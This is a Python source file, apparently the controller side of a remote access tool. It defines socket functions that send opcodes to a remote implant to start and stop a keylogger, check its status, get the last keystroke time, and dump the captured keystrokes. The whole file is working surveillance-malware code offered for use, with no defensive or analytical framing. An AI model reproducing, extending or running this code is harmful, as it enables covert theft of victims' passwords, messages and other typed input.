import socket,time



def Keylogger_Start(sock):
    try:
        sock.send(int(14).to_bytes(4,'little'))

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404    


def Keylogger_Dump(sock):
    try:
        sock.send(int(18).to_bytes(4,'little'))
        size = int.from_bytes(sock.recv(4),'little')

        if(size == 0):
            print("[!]No Data")
        else:
            print("[+]KeyStroke Log Size: ",size)
            while (size > 0):
                text = sock.recv(size)
                size -= len(text)
                print(str(text,encoding ='ascii'))
        return 0
    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404

def Keylogger_Status(sock):
    try:
        sock.send(int(15).to_bytes(4,'little'))
        status = int.from_bytes(sock.recv(1),'little')

        if(status == 1):
            print("[+]Keylogger is Active")
        else:
            print('[-]Keylogger is Deactive')

        return 0
    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404        


def Keylogger_time(sock):
    try:
        sock.send(int(16).to_bytes(4,'little'))
        time_t = int.from_bytes(sock.recv(8),'little')
        
        if(time_t == 0):
            print("[!]No Key Has Been Pressed")
        else:    
            print("[+]Last KeyStroke: ",time.ctime(time_t))

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except socket.timeout as Err:
        print(str(Err));return 404


def Keylogger_Stop(sock):
    try:
        sock.send(int(17).to_bytes(4,'little'))

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404         